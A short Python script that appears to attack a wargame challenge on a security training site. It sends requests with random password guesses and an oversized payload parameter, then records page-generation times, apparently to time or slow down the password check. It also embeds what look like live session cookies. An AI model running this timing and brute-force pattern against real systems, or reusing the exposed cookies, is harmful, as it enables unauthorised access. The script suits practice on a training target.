import requests
import random

URL = "https://defendtheweb.net/playground/slow-things-down"
domain="defendtheweb.net"
auth_remember_cookie = "bbc395ab3991c0984b4426092ab1864201166fae7537ce417de42034f3ebe799"
PHPSESSID_cookie = "q0hpietims8p6r7egri1lc207r"
request_count = 10

session = requests.Session()
session.cookies.set_cookie(requests.cookies.create_cookie('auth_remember', auth_remember_cookie))
session.cookies.set_cookie(requests.cookies.create_cookie('PHPSESSID', PHPSESSID_cookie))

times: [float] = []

with open('new_file.txt', 'w+') as payload:
    for i in range(1, 10_000_000):
        payload.write(f'This is line #{i}.')

    for i in range(request_count):
        if i % 100 == 0 and i != 0:
            print(f'{i} requests sent...')
            print(f'Current min: {min(times)} ms')
            print(f'Current max: {max(times)} ms')
            print(f'Current average: {sum(times) / len(times)} ms')

        PARAMS = {'password': str(random.randint(9999, 999999)), 'test': payload}
        res = session.get(url=URL, params=PARAMS)
        try:
            time = float(res.text.split("This page generated in ", 1)[1].split("ms")[0])
        except:
            continue
        if time >= 1.0:
            print(res.text)
        times.append(time)

    print(f'{request_count} requests')
    print("--------------------------------------------")
    print(f'Min: {min(times)} ms')
    print(f'Max: {max(times)} ms')
    print(f'Average: {sum(times) / len(times)} ms')
